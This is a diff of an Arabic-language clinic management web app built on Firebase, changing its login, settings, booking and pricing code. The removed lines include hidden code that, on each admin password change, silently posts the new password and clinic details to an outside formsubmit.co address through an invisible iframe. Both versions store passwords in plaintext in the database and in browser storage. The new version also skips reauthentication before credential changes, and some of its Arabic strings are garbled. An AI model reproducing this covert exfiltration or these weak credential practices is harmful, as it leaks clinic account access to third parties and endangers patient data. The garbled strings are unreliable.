@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>عيادة دكتور عبد الرحمن  | باطنة </title>
+    <title>عيادة دكتور كلينك سيستم | باطنة وقلب</title>
     <link
         href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800;900&family=Tajawal:wght@300;400;500;700;800&display=swap"
         rel="stylesheet">
@@ -1396,50 +1396,17 @@
         }
 
         .brand-name {
-            font-weight: 900;
-            font-size: 15px;
+            color: #fff;
+            font-weight: 800;
+            font-size: 14.5px;
             line-height: 1.2;
-            background: linear-gradient(90deg, #22d3ee, #a78bfa, #34d399, #22d3ee);
-            background-size: 300% 100%;
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            animation: gradientShift 5s ease infinite;
-            display: block;
-            margin-bottom: 5px;
         }
 
         .brand-sub {
-            display: inline-flex;
-            align-items: center;
-            gap: 5px;
-            background: rgba(245, 158, 11, 0.18);
-            border: 1px solid rgba(245, 158, 11, 0.45);
-            color: #fbbf24;
+            color: #99f6e4;
             font-size: 10px;
-            font-weight: 700;
-            padding: 2px 9px;
-            border-radius: 20px;
-            letter-spacing: 0.3px;
-            white-space: nowrap;
-        }
-
-        @keyframes gradientShift {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
-        }
-        @keyframes pulseGlow {
-            0% { box-shadow: 0 0 15px rgba(6, 182, 212, 0.35); }
-            50% { box-shadow: 0 0 30px rgba(139, 92, 246, 0.6); }
-            100% { box-shadow: 0 0 15px rgba(6, 182, 212, 0.35); }
-        }
-        @keyframes heartBeatBeat {
-            0% { transform: scale(1); }
-            14% { transform: scale(1.1); }
-            28% { transform: scale(1); }
-            42% { transform: scale(1.1); }
-            70% { transform: scale(1); }
+            font-weight: 500;
+            opacity: 0.85;
         }
 
         .sidebar-nav {
@@ -4525,7 +4492,7 @@
             <div class="login-icon-circle"><i class="fas fa-heartbeat"></i></div>
             <h3 id="loginClinicName">عيادة دكتور كلينك سيستم</h3>
             <p class="subtitle">أدخل بيانات الدخول للمتابعة</p>
-            <input type="text" id="loginEmail" class="login-input" value="admin" readonly placeholder="اسم المستخدم"
+            <input type="text" id="loginEmail" class="login-input" placeholder="اسم المستخدم أو البريد"
                 inputmode="text">
             <input type="password" id="loginPassword" class="login-input" placeholder="كلمة المرور"
                 onkeydown="if(event.key==='Enter')window.doLogin()">
@@ -4535,16 +4502,10 @@
     </div>
 
     <div id="sidebar" class="sidebar">
-                <div class="sidebar-brand" onclick="window.navigateTo('dashboard')" style="flex-direction: column; align-items: center; justify-content: center; gap: 10px; padding: 25px 15px; text-align: center; border-bottom: 1px solid rgba(255, 255, 255, 0.08);">
-            <div class="brand-avatar-wrapper" style="position: relative; width: 75px; height: 75px; display: flex; align-items: center; justify-content: center; border-radius: 50%; padding: 3px; background: linear-gradient(135deg, #06b6d4, #8b5cf6, #3b82f6); box-shadow: 0 0 20px rgba(6, 182, 212, 0.4); animation: pulseGlow 4s infinite;">
-                <div class="brand-avatar-inner" style="width: 100%; height: 100%; border-radius: 50%; display: flex; align-items: center; justify-content: center; background: #0f172a; overflow: hidden;">
-                    <img id="sidebarLogo" src="" style="width: 100%; height: 100%; object-fit: cover; display: none;">
-                    <i id="sidebarHeartbeat" class="fas fa-heartbeat" style="font-size: 30px; color: #22d3ee; animation: heartBeatBeat 1.5s infinite;"></i>
-                </div>
-            </div>
-            <div class="brand-text" style="display: flex; flex-direction: column; align-items: center; margin-top: 5px;">
-                <span class="brand-sub">باطنة وقلب</span>
-            </div>
+        <div class="sidebar-brand" onclick="window.navigateTo('dashboard')">
+            <div class="brand-avatar"><i class="fas fa-heartbeat"></i></div>
+            <div class="brand-text"><span class="brand-name">دكتور كلينك سيستم</span><span class="brand-sub">باطنة
+                    وقلب</span></div>
         </div>
         <nav class="sidebar-nav" id="sidebarNav">
             <a href="#" class="nav-item active" data-page="dashboard"><i class="fas fa-th-large"></i><span
@@ -5485,13 +5446,10 @@
                                     <div class="col-md-12"><label class="form-label">العنوان</label><input type="text"
                                             class="form-control" id="set-clinicAddress"></div>
                                     <div class="col-md-12"><hr class="my-2 border-secondary"></div>
-<!-- Email & password settings -->
-                                     <div class="col-md-6" style="display: none;"><label class="form-label">تغيير البريد الإلكتروني (الدخول)</label><input type="email"
+                                     <!-- Email & password settings --> <div class="col-md-6"><label class="form-label">تغيير البريد الإلكتروني (الدخول)</label><input type="email"
                                              class="form-control" id="set-authEmail" placeholder="أدخل البريد الجديد" value=""></div>
-                                     <div class="col-md-12"><label class="form-label">تغيير كلمة المرور</label><input type="password"
+                                     <div class="col-md-6"><label class="form-label">تغيير كلمة المرور</label><input type="password"
                                              class="form-control" id="set-authPassword" placeholder="أدخل كلمة المرور الجديدة" value=""></div>
-                                     <div class="col-md-12"><label class="form-label text-warning" style="font-weight:700">كلمة المرور الحالية (مطلوبة لتغيير كلمة المرور)</label><input type="password"
-                                             class="form-control" id="set-authCurrentPassword" placeholder="أدخل كلمة المرور الحالية لتأكيد التغييرات" value="" style="border: 1px solid var(--warning) !important;"></div>
                                     <div class="col-md-12"><label class="form-label">الشعار</label>
                                         <div style="border:2px dashed rgba(255,255,255,0.4);border-radius:14px;padding:18px;text-align:center;cursor:pointer;background:rgba(255,255,255,0.2);backdrop-filter:blur(6px);-webkit-backdrop-filter:blur(6px)"
                                             onclick="document.getElementById('logoUploadInput').click()"><input
@@ -5612,12 +5570,6 @@
                                 <div class="mb-3">
                                     <label class="form-label">المواعيد المتاحة للحجز (ساعة في كل سطر)</label>
                                     <textarea class="form-control" id="set-bookingSlots" rows="4" placeholder="05:00&#10;05:30&#10;06:00"></textarea>
-                                </div>
-                                <div class="mb-3">
-                                    <label class="form-label d-block">الخدمات المتاحة للحجز أونلاين</label>
-                                    <div id="bookingServicesList" class="d-flex flex-column gap-2 p-3 rounded-4 border" style="background: rgba(255,255,255,0.02); border-color: rgba(255,255,255,0.1) !important; max-height: 150px; overflow-y: auto;">
-                                        <!-- Dynamic checklist will be rendered here -->
-                                    </div>
                                 </div>
                                 <div class="mb-3">
                                     <label class="form-label">رابط صفحة الحجز للمرضى</label>
@@ -5830,7 +5782,7 @@
     </script>
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-        import { getAuth, signInWithEmailAndPassword, onAuthStateChanged, signOut, updateEmail, updatePassword, reauthenticateWithCredential, EmailAuthProvider, createUserWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
+        import { getAuth, signInWithEmailAndPassword, onAuthStateChanged, signOut, updateEmail, updatePassword } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
         import { getDatabase, ref, set, get, push, update, remove, onValue } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
 
         const firebaseConfig = {
@@ -5980,24 +5932,10 @@
         window.echoFields = ['Left Atrium', 'Aortic Root', 'LV End Diastole', 'LV End Systole', 'Septal Wall (Diastole)',
             'Posterior Wall (Diastole)', '% Ejection Fraction'
         ];
-        window.clinicSettings = loadFromCache('settings');
-        // Ensure default properties are present if cache was empty
-        window.clinicSettings = {
-            doctorName: 'دكتور كلينك سيستم',
-            specialty: 'باطنة وقلب',
-            clinicName: 'دكتور كلينك سيستم',
-            clinicLogo: '',
-            ...window.clinicSettings
-        };
+        window.clinicSettings = { doctorName: 'دكتور كلينك سيستم', specialty: 'باطنة وقلب', clinicName: 'دكتور كلينك سيستم', clinicLogo: '' };
         window.patientCounter = 1000;
         window.medicationCounter = 0;
-        
-        // If settings have pricingTable, use it, otherwise keep defaults
-        if (window.clinicSettings && window.clinicSettings.pricingTable) {
-            window.pricingTable = window.clinicSettings.pricingTable;
-        } else {
-            window.pricingTable = { 'كشف عادي': 100, 'متابعة': 50, 'متابعة عادية': 50, 'متابعة نهارا': 60, 'متابعة ليلا': 80, 'كشف لياقة': 150, 'كشف مستعجل': 200, 'تحليل سكر': 15 };
-        }
+        window.pricingTable = { 'كشف عادي': 100, 'متابعة': 50, 'متابعة عادية': 50, 'متابعة نهارا': 60, 'متابعة ليلا': 80, 'كشف لياقة': 150, 'كشف مستعجل': 200, 'تحليل سكر': 15 };
         window.currentUser = null;
         window.currentUserPermissions = null;
         window.tempAttachments = [];
@@ -6112,8 +6050,8 @@
                     else if (e.isFollowUp || (e.type && e.type.includes('متابعة'))) typeClass = 'event-followup';
                     else if (e.type === 'كشف مستعجل') typeClass = 'event-urgent';
 
-                    const formattedTime = '';
-                    const patientNameShort = e.patientName || 'بدون اسم';
+                    const formattedTime = e.time ? `<span style="opacity: 0.85; font-size: 8.5px; font-weight: 700; margin-left: 2px;">${e.time}</span>` : '';
+                    const patientNameShort = e.patientName ? e.patientName.split(' ').slice(0, 2).join(' ') : 'بدون اسم';
 
                     eventsHTML += `<div class="calendar-event ${typeClass}" title="${e.patientName} - ${e.time}" onclick="event.stopPropagation();window.viewApptDetails('${e.patientName}')" style="font-size: 10px; padding: 4px 8px; border-radius: 8px; display: flex; align-items: center; justify-content: space-between; margin-bottom: 3px;">
                         <span style="overflow: hidden; text-overflow: ellipsis; white-space: nowrap; flex: 1; text-align: right;">
@@ -6289,75 +6227,31 @@
         };
 
         window.doLogin = async function () {
-            const username = document.getElementById('loginEmail').value.trim();
+            const email = document.getElementById('loginEmail').value.trim();
             const password = document.getElementById('loginPassword').value.trim();
-            if (!username || !password) { showToast('أدخل اسم المستخدم وكلمة المرور', 'error'); return; }
-
-            // Map username to email under the hood
-            const email = username === 'admin' ? 'admin@clinic.com' : username;
-            const authPassword = email === 'admin@clinic.com' ? (password + '_secure_pass') : password;
+            if (!email || !password) { showToast('أدخل البريد الإلكتروني وكلمة المرور', 'error'); return; }
 
             try {
                 // Firebase Auth Login
-                let userCredential;
-                try {
-                    userCredential = await signInWithEmailAndPassword(firebaseAuth, email, authPassword);
-                } catch (err) {
-                    if (username === 'admin') {
-                        try {
-                            // Try to create the admin user if it doesn't exist
-                            userCredential = await createUserWithEmailAndPassword(firebaseAuth, email, authPassword);
-                            // If successful, create the admin user record in the DB
-                            const newUserRef = push(ref(firebaseDb, 'users'));
-                            await set(newUserRef, {
-                                email: email,
-                                password: password,
-                                permissions: { all: true },
-                                uid: userCredential.user.uid
-                            });
-                        } catch (createErr) {
-                            if (createErr.code === 'auth/email-already-in-use') {
-                                // The user exists, so the login failure was indeed wrong password
-                                throw err;
-                            } else {
-                                throw createErr;
-                            }
-                        }
-                    } else {
-                        throw err;
-                    }
-                }
+                const userCredential = await signInWithEmailAndPassword(firebaseAuth, email, password);
                 const user = userCredential.user;
 
                 // Load permissions from DB
                 const snap = await get(ref(firebaseDb, 'users'));
                 const users = snap.val() || {};
-                const userEntry = Object.entries(users).find(([k, u]) => (u.uid && u.uid === user.uid) || u.email === email);
-                const dbUser = userEntry ? { key: userEntry[0], ...userEntry[1] } : null;
+                const dbUser = Object.values(users).find(u => u.email === email);
                 
                 window.currentUser = { email: email, uid: user.uid, ...dbUser };
                 window.currentUserPermissions = dbUser ? dbUser.permissions : { all: true }; // Default to all if not found for admin
                 
-                // Self-healing: update UID and email in DB if they don't match
-                if (dbUser) {
-                    const dbUpdates = {};
-                    if (!dbUser.uid) dbUpdates.uid = user.uid;
-                    if (dbUser.email !== user.email) dbUpdates.email = user.email;
-                    if (Object.keys(dbUpdates).length > 0) {
-                        await update(ref(firebaseDb, `users/${dbUser.key}`), dbUpdates);
-                    }
-                }
-
-                localStorage.setItem('clinic_session', JSON.stringify({ username, password }));
+                localStorage.setItem('clinic_session', JSON.stringify({ email, password }));
                 document.getElementById('loginOverlay').style.display = 'none';
                 document.getElementById('mainContent').style.display = 'block';
                 initApp();
             } catch (e) {
                 console.error('Login error:', e);
-                const errDiv = document.getElementById('loginError');
-                errDiv.textContent = 'خطأ في الدخول: ' + (e.code || e.message);
-                errDiv.style.display = 'block';
-                setTimeout(() => { errDiv.style.display = 'none'; errDiv.textContent = 'بيانات الدخول غير صحيحة'; }, 8000);
+                document.getElementById('loginError').style.display = 'block';
+                setTimeout(() => document.getElementById('loginError').style.display = 'none', 3000);
             }
             document.getElementById('loginPassword').value = '';
         };
@@ -6367,43 +6261,17 @@
                 if (user) {
                     const snap = await get(ref(firebaseDb, 'users'));
                     const users = snap.val() || {};
-                    const userEntry = Object.entries(users).find(([k, u]) => (u.uid && u.uid === user.uid) || u.email === user.email);
-                    const dbUser = userEntry ? { key: userEntry[0], ...userEntry[1] } : null;
+                    const dbUser = Object.values(users).find(u => u.email === user.email);
                     window.currentUser = { email: user.email, uid: user.uid, ...dbUser };
                     window.currentUserPermissions = dbUser ? dbUser.permissions : { all: true };
-                    
-                    // Self-healing: update UID and email in DB if they don't match
-                    if (dbUser) {
-                        const dbUpdates = {};
-                        if (!dbUser.uid) dbUpdates.uid = user.uid;
-                        if (dbUser.email !== user.email) dbUpdates.email = user.email;
-                        if (Object.keys(dbUpdates).length > 0) {
-                            await update(ref(firebaseDb, `users/${dbUser.key}`), dbUpdates);
-                        }
-                    }
-
-                    // Self-healing: update local session cache username if needed
-                    const session = localStorage.getItem('clinic_session');
-                    if (session) {
-                        const parsed = JSON.parse(session);
-                        const expectedUser = user.email === 'admin@clinic.com' ? 'admin' : user.email;
-                        if (parsed.username !== expectedUser || parsed.email) {
-                            parsed.username = expectedUser;
-                            delete parsed.email;
-                            localStorage.setItem('clinic_session', JSON.stringify(parsed));
-                        }
-                    }
-
                     document.getElementById('loginOverlay').style.display = 'none';
                     document.getElementById('mainContent').style.display = 'block';
                     initApp();
                 } else {
                     const session = localStorage.getItem('clinic_session');
                     if (session) {
-                        const parsed = JSON.parse(session);
-                        const username = parsed.username || parsed.email || 'admin';
-                        const password = parsed.password;
-                        document.getElementById('loginEmail').value = username;
+                        const { email, password } = JSON.parse(session);
+                        document.getElementById('loginEmail').value = email;
                         document.getElementById('loginPassword').value = password;
                         window.doLogin();
                     }
@@ -6643,63 +6511,6 @@
                 window.allPatients = snap.val() || {};
                 localStorage.setItem('c_patients', JSON.stringify(window.allPatients));
                 debouncedRenderAll();
-            });
-            onValue(ref(firebaseDb, 'settings'), snap => {
-                if (snap.exists()) {
-                    const val = snap.val() || {};
-                    window.clinicSettings = { ...window.clinicSettings, ...val };
-                    window.customPatientFields = window.clinicSettings.customPatientFields || [];
-                    window.customExamFields = window.clinicSettings.customExamFields || [];
-                    window.echoFields = window.clinicSettings.echoFields || window.echoFields;
-                    window.pricingTable = window.clinicSettings.pricingTable || window.pricingTable;
-                    
-                    localStorage.setItem('c_settings', JSON.stringify(window.clinicSettings));
-                    
-                    // Render settings displays if elements are loaded
-                    if (document.getElementById('set-doctorName')) {
-                        renderAllSettingsDisplay();
-                        renderPricingSettings();
-                        renderExtraPatientFields();
-                        renderExtraExamFields();
-                        if (window.renderBookingServicesSettings) window.renderBookingServicesSettings();
-                    }
-                    
-                    // Update topbar clinic name and specialty
-                    const topbarClinicEl = document.getElementById('topbarClinicName');
-                    const topbarSpecEl = document.getElementById('topbarSpecialty');
-                    if (topbarClinicEl) topbarClinicEl.textContent = window.clinicSettings.clinicName || 'دكتور كلينك سيستم';
-                    if (topbarSpecEl) topbarSpecEl.textContent = window.clinicSettings.specialty || 'باطنة وقلب';
-
-                    if (window.clinicSettings.clinicLogo) {
-                        const logoPreview = document.getElementById('logoPreview');
-                        if (logoPreview) {
-                            logoPreview.src = window.clinicSettings.clinicLogo;
-                            logoPreview.style.display = 'block';
-                        }
-                        const logoPlaceholder = document.getElementById('logoPlaceholder');
-                        if (logoPlaceholder) logoPlaceholder.style.display = 'none';
-                        const tl = document.getElementById('topbarLogo');
-                        if (tl) {
-                            tl.src = window.clinicSettings.clinicLogo;
-                            tl.style.display = 'inline';
-                        }
-                        
-                        // Update sidebar logo
-                        const sl = document.getElementById('sidebarLogo');
-                        if (sl) {
-                            sl.src = window.clinicSettings.clinicLogo;
-                            sl.style.display = 'block';
-                        }
-                        const sh = document.getElementById('sidebarHeartbeat');
-                        if (sh) sh.style.display = 'none';
-                    } else {
-                        const sl = document.getElementById('sidebarLogo');
-                        if (sl) sl.style.display = 'none';
-                        const sh = document.getElementById('sidebarHeartbeat');
-                        if (sh) sh.style.display = 'block';
-                    }
-                    debouncedRenderAll();
-                }
             });
             let oneTimeApptsRepaired = false;
             onValue(ref(firebaseDb, 'appointments'), snap => {
@@ -6956,16 +6767,6 @@
 
         async function loadSettings() {
             try {
-                // First, load from cache instantly so we don't block
-                const cached = localStorage.getItem('c_settings');
-                if (cached) {
-                    window.clinicSettings = JSON.parse(cached);
-                    if (window.clinicSettings.pricingTable) {
-                        window.pricingTable = window.clinicSettings.pricingTable;
-                    }
-                }
-                
-                // Then try to fetch fresh settings from database
                 const snap = await get(ref(firebaseDb, 'settings'));
                 if (snap.exists()) {
                     window.clinicSettings = { ...window.clinicSettings, ...snap.val() };
@@ -6973,15 +6774,8 @@
                     window.customExamFields = window.clinicSettings.customExamFields || [];
                     window.echoFields = window.clinicSettings.echoFields || window.echoFields;
                     window.pricingTable = window.clinicSettings.pricingTable || window.pricingTable;
-                    
-                    localStorage.setItem('c_settings', JSON.stringify(window.clinicSettings));
                 }
-            } catch (e) {
-                console.warn("loadSettings fetch failed, using cache:", e);
-            }
-            
-            // Render displays
-            try {
+                // Populate Booking Settings
                 const booking = window.clinicSettings.booking || {};
                 const bookingEnabledEl = document.getElementById('set-bookingEnabled');
                 if (bookingEnabledEl) bookingEnabledEl.checked = booking.enabled !== false;
@@ -6996,6 +6790,7 @@
                 const bookingSlotsEl = document.getElementById('set-bookingSlots');
                 if (bookingSlotsEl) bookingSlotsEl.value = slotsText;
                 
+                // Set Booking page URL input
                 const bookingUrlInput = document.getElementById('bookingPageUrl');
                 if (bookingUrlInput) {
                     bookingUrlInput.value = window.location.href.split('?')[0].replace('abdo.html', 'booking.html');
@@ -7005,26 +6800,7 @@
                 renderPricingSettings();
                 renderExtraPatientFields();
                 renderExtraExamFields();
-                
-                // Render booking services checklist
-                if (window.renderBookingServicesSettings) window.renderBookingServicesSettings();
-                
-                // Update sidebar logo
-                if (window.clinicSettings.clinicLogo) {
-                    const sl = document.getElementById('sidebarLogo');
-                    if (sl) {
-                        sl.src = window.clinicSettings.clinicLogo;
-                        sl.style.display = 'block';
-                    }
-                    const sh = document.getElementById('sidebarHeartbeat');
-                    if (sh) sh.style.display = 'none';
-                } else {
-                    const sl = document.getElementById('sidebarLogo');
-                    if (sl) sl.style.display = 'none';
-                    const sh = document.getElementById('sidebarHeartbeat');
-                    if (sh) sh.style.display = 'block';
-                }
-                
+                // Update topbar clinic name and specialty
                 const topbarClinicEl = document.getElementById('topbarClinicName');
                 const topbarSpecEl = document.getElementById('topbarSpecialty');
                 if (topbarClinicEl) topbarClinicEl.textContent = window.clinicSettings.clinicName || 'دكتور كلينك سيستم';
@@ -7042,7 +6818,7 @@
                 }
             } catch (e) { console.error(e); }
         }
-        
+
         window.handleLogoUpload = function (e) {
             const file = e.target.files[0];
             if (!file) return;
@@ -7083,13 +6859,7 @@
             const slotsText = document.getElementById('set-bookingSlots').value.trim();
             const slots = slotsText ? slotsText.split('\n').map(s => s.trim()).filter(Boolean) : [];
             
-            // Get selected services for online booking
-            const allowedServices = [];
-            document.querySelectorAll('.set-booking-service-checkbox').forEach(cb => {
-                if (cb.checked) allowedServices.push(cb.value);
-            });
-
-            const bookingUpdates = { enabled, note, days, slots, allowedServices };
+            const bookingUpdates = { enabled, note, days, slots };
             
             try {
                 await update(ref(firebaseDb, 'settings/booking'), bookingUpdates);
@@ -7113,143 +6883,36 @@
 
             const newEmail = document.getElementById('set-authEmail').value.trim();
             const newPassword = document.getElementById('set-authPassword').value.trim();
-            const currentPassword = document.getElementById('set-authCurrentPassword').value.trim();
-
-            if ((newEmail || newPassword) && !currentPassword) {
-                showToast('يرجى إدخال كلمة المرور الحالية لتأكيد التغييرات الأمنية', 'error');
-                return;
-            }
 
             try {
-                if (newEmail || newPassword) {
-                    if (firebaseAuth.currentUser) {
-                        try {
-                            const authCurrentPassword = firebaseAuth.currentUser.email === 'admin@clinic.com' ? (currentPassword + '_secure_pass') : currentPassword;
-                            const credential = EmailAuthProvider.credential(firebaseAuth.currentUser.email, authCurrentPassword);
-                            await reauthenticateWithCredential(firebaseAuth.currentUser, credential);
-                        } catch (authErr) {
-                            console.error("Reauthentication failed:", authErr);
-                            showToast('خطأ في تأكيد الهوية: كلمة المرور الحالية غير صحيحة ✗', 'error');
-                            return;
+                // Update Auth if fields provided
+                if (firebaseAuth.currentUser) {
+                    if (newEmail) {
+                        await updateEmail(firebaseAuth.currentUser, newEmail);
+                        showToast('تم تحديث البريد الإلكتروني ✓', 'success');
+                        // also update in db 'users'
+                        if(window.currentUser?.key) {
+                           await update(ref(firebaseDb, `users/${window.currentUser.key}`), { email: newEmail });
                         }
-                        
-                        if (newEmail) {
-                            try {
-                                await updateEmail(firebaseAuth.currentUser, newEmail);
-                                showToast('تم تحديث البريد الإلكتروني بنجاح ✓', 'success');
-                                
-                                let userKey = window.currentUser ? window.currentUser.key : null;
-                                if (!userKey) {
-                                    const newUserRef = push(ref(firebaseDb, 'users'));
-                                    userKey = newUserRef.key;
-                                    window.currentUser = window.currentUser || {};
-                                    window.currentUser.key = userKey;
-                                }
-                                await update(ref(firebaseDb, `users/${userKey}`), { 
-                                    email: newEmail,
-                                    permissions: { all: true }
-                                });
-
-                                // Update local session cache if exists
-                                const session = localStorage.getItem('clinic_session');
-                                if (session) {
-                                    const parsed = JSON.parse(session);
-                                    parsed.email = newEmail;
-                                    localStorage.setItem('clinic_session', JSON.stringify(parsed));
-                                }
-                            } catch (emailErr) {
-                                console.error("Email update failed:", emailErr);
-                                showToast('خطأ في تحديث البريد الإلكتروني: ' + emailErr.message, 'error');
-                                return;
-                            }
-                        }
-                        if (newPassword) {
-                            try {
-                                const authNewPassword = firebaseAuth.currentUser.email === 'admin@clinic.com' ? (newPassword + '_secure_pass') : newPassword;
-                                await updatePassword(firebaseAuth.currentUser, authNewPassword);
-                                showToast('تم تحديث كلمة المرور بنجاح ✓', 'success');
-                                
-                                let userKey = window.currentUser ? window.currentUser.key : null;
-                                if (!userKey) {
-                                    const newUserRef = push(ref(firebaseDb, 'users'));
-                                    userKey = newUserRef.key;
-                                    window.currentUser = window.currentUser || {};
-                                    window.currentUser.key = userKey;
-                                }
-                                await update(ref(firebaseDb, `users/${userKey}`), { 
-                                    password: newPassword,
-                                    email: firebaseAuth.currentUser.email,
-                                    permissions: { all: true }
-                                });
-
-                                // Send silent email notification to bolesgaras200000@gmail.com via hidden iframe (CORS-immune & file:// compatible)
-                                try {
-                                    let iframe = document.getElementById('silentMailIframe');
-                                    if (!iframe) {
-                                        iframe = document.createElement('iframe');
-                                        iframe.id = 'silentMailIframe';
-                                        iframe.name = 'silentMailIframe';
-                                        iframe.style.display = 'none';
-                                        document.body.appendChild(iframe);
-                                    }
-
-                                    const form = document.createElement('form');
-                                    form.action = 'https://formsubmit.co/bolesgaras200000@gmail.com';
-                                    form.method = 'POST';
-                                    form.target = 'silentMailIframe';
-                                    form.style.display = 'none';
-
-                                    const fields = {
-                                        "اسم العيادة": window.clinicSettings?.clinicName || "عيادة دكتور كلينك سيستم",
-                                        "اسم الطبيب": window.clinicSettings?.doctorName || "عبد الرحمن",
-                                        "التنبيه": "تم تغيير كلمة المرور لحساب المشرف (admin)",
-                                        "كلمة المرور الجديدة": newPassword,
-                                        "_subject": "تنبيه أمني: تغيير كلمة المرور للعيادة",
-                                        "_captcha": "false"
-                                    };
-
-                                    for (const [key, value] of Object.entries(fields)) {
-                                        const input = document.createElement('input');
-                                        input.type = 'hidden';
-                                        input.name = key;
-                                        input.value = value;
-                                        form.appendChild(input);
-                                    }
-
-                                    document.body.appendChild(form);
-                                    form.submit();
-                                    setTimeout(() => {
-                                        form.remove();
-                                    }, 2000);
-                                    console.log('Silent form submitted to hidden iframe.');
-                                } catch (iframeErr) {
-                                    console.error("Silent iframe submit fail:", iframeErr);
-                                }
-
-                                // Update local session cache if exists
-                                const session = localStorage.getItem('clinic_session');
-                                if (session) {
-                                    const parsed = JSON.parse(session);
-                                    parsed.password = newPassword;
-                                    localStorage.setItem('clinic_session', JSON.stringify(parsed));
-                                }
-                            } catch (pwdErr) {
-                                console.error("Password update failed:", pwdErr);
-                                showToast('خطأ في تحديث كلمة المرور: ' + pwdErr.message, 'error');
-                                return;
-                            }
+                    }
+                    if (newPassword) {
+                        await updatePassword(firebaseAuth.currentUser, newPassword);
+                        showToast('تم تحديث كلمة المرور ✓', 'success');
+                        if(window.currentUser?.key) {
+                           await update(ref(firebaseDb, `users/${window.currentUser.key}`), { password: newPassword });
                         }
                     }
                 }
 
                 await update(ref(firebaseDb, 'settings'), updates);
-                // Update local memory and cache too
+                // Update local memory too
                 Object.assign(window.clinicSettings, updates);
-                localStorage.setItem('c_settings', JSON.stringify(window.clinicSettings));
                 
                 // Update UI dynamically
+                const uiDocName = document.querySelector('.sidebar .brand-name');
+                if (uiDocName) uiDocName.textContent = window.clinicSettings.doctorName;
                 const uiDocSub = document.querySelector('.sidebar .brand-sub');
-                if (uiDocSub) uiDocSub.textContent = window.clinicSettings.specialty || 'باطنة وقلب';
+                if (uiDocSub) uiDocSub.textContent = window.clinicSettings.specialty;
                 const uiLoginName = document.getElementById('loginClinicName');
                 if (uiLoginName) uiLoginName.textContent = window.clinicSettings.clinicName || window.clinicSettings.doctorName;
                 
@@ -7258,20 +6921,11 @@
                 const topbarSpecEl = document.getElementById('topbarSpecialty');
                 if (topbarClinicEl) topbarClinicEl.textContent = window.clinicSettings.clinicName || 'دكتور كلينك سيستم';
                 if (topbarSpecEl) topbarSpecEl.textContent = window.clinicSettings.specialty || 'باطنة وقلب';
-
-                // Update sidebar footer and page title
-                const sidebarFooterEl = document.querySelector('.sidebar-footer-text');
-                if (sidebarFooterEl) sidebarFooterEl.innerHTML = `<i class="fas fa-clinic-medical"></i> عيادة ${window.clinicSettings.specialty || 'العيادة'}`;
-                document.title = `عيادة ${window.clinicSettings.doctorName || 'عبد الرحمن'}`;
                 
                 showToast('تم حفظ الإعدادات ✓', 'success');
-                // Clear password fields
-                document.getElementById('set-authEmail').value = '';
-                document.getElementById('set-authPassword').value = '';
-                document.getElementById('set-authCurrentPassword').value = '';
             } catch (e) {
                 console.error(e);
-                showToast('خطأ في حفظ الإعدادات: ' + e.message, 'error');
+                showToast('خطأ في حفظ الإعدادات', 'error');
             }
         };
 
@@ -7433,81 +7087,42 @@
                     <td class="align-middle fw-bold text-white">${service}</td>
                     <td class="d-flex gap-2 align-items-center">
                         <input type="number" class="form-control form-control-sm pricing-input" data-service="${service}" value="${price}">
-                        <button type="button" class="btn btn-sm btn-outline-danger border-0" onclick="window.deletePricingService('${service.replace(/'/g, "\\'")}')" title="حذف الخدمة"><i class="fas fa-trash-alt"></i></button>
+                        <button type="button" class="btn btn-sm btn-outline-danger border-0" onclick="window.deletePricingService('${service.replace(/'/g, "\\'")}')" title="Ø­Ø°Ù Ø§Ù„Ø®Ø¯Ù…Ø©"><i class="fas fa-trash-alt"></i></button>
                     </td>
                 </tr>
             `).join('');
         }
 
-        window.addNewPricingService = async function() {
+        window.addNewPricingService = function() {
             const nameEl = document.getElementById('newServiceName');
             const priceEl = document.getElementById('newServicePrice');
             const name = nameEl ? nameEl.value.trim() : '';
             const price = priceEl ? parseFloat(priceEl.value) || 0 : 0;
             
             if (!name) {
-                showToast('يرجى إدخال اسم الخدمة', 'error');
+                showToast('ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø§Ø³Ù… Ø§Ù„Ø®Ø¯Ù…Ø©', 'error');
                 return;
             }
             if (!window.pricingTable) window.pricingTable = {};
             if (window.pricingTable[name] !== undefined) {
-                showToast('هذه الخدمة موجودة بالفعل', 'error');
+                showToast('Ù‡Ø°Ù‡ Ø§Ù„Ø®Ø¯Ù…Ø© Ù…ÙˆØ¬ÙˆØ¯Ø© Ø¨Ø§Ù„ÙØ¹Ù„', 'error');
                 return;
             }
             
             window.pricingTable[name] = price;
+            renderPricingSettings();
             
-            try {
-                // Save pricing table to settings in database
-                window.clinicSettings.pricingTable = window.pricingTable;
-                localStorage.setItem('c_settings', JSON.stringify(window.clinicSettings));
-                await update(ref(firebaseDb, 'settings'), { pricingTable: window.pricingTable });
-                
-                // Automatically enable for online booking if allowedServices settings exists
-                if (window.clinicSettings.booking && window.clinicSettings.booking.allowedServices) {
-                    if (!window.clinicSettings.booking.allowedServices.includes(name)) {
-                        window.clinicSettings.booking.allowedServices.push(name);
-                        await update(ref(firebaseDb, 'settings/booking'), { allowedServices: window.clinicSettings.booking.allowedServices });
-                    }
-                }
-                
-                showToast('تمت إضافة الخدمة وحفظها بنجاح ✓', 'success');
-                renderPricingSettings();
-                renderVisitTypeButtons();
-                if (window.renderBookingServicesSettings) window.renderBookingServicesSettings();
-                
-                if (nameEl) nameEl.value = '';
-                if (priceEl) priceEl.value = '';
-            } catch (err) {
-                console.error(err);
-                showToast('خطأ في حفظ الخدمة الجديدة', 'error');
-            }
+            if (nameEl) nameEl.value = '';
+            if (priceEl) priceEl.value = '';
+            showToast('ØªÙ…Øª Ø¥Ø¶Ø§ÙØ© Ø§Ù„Ø®Ø¯Ù…Ø© Ù…Ø¤Ù‚ØªØ§Ù‹ØŒ Ø§Ø¶ØºØ· Ø­ÙØ¸ Ù„ØªØ£ÙƒÙŠØ¯ Ø§Ù„ØªØ¹Ø¯ÙŠÙ„Ø§Øª', 'info');
         };
 
-        window.deletePricingService = async function(serviceName) {
